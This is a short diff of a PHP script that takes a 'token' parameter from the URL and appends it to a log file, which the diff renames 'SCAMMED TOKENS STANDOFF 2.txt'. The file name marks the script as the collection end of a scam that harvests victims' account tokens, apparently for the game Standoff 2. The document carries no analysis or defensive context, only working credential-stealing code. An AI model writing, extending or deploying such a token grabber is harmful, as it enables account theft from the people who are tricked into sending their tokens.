@@ -1,9 +1,9 @@
 <?php
  
-$login = $_GET['token'];
+$token = $_GET['token'];
  
-$file = fopen('file.txt', 'a');
-fwrite($file, $login . PHP_EOL);
+$file = fopen('SCAMMED TOKENS STANDOFF 2.txt', 'a');
+fwrite($file, $token . PHP_EOL);
 fclose($file);
  
 ?>
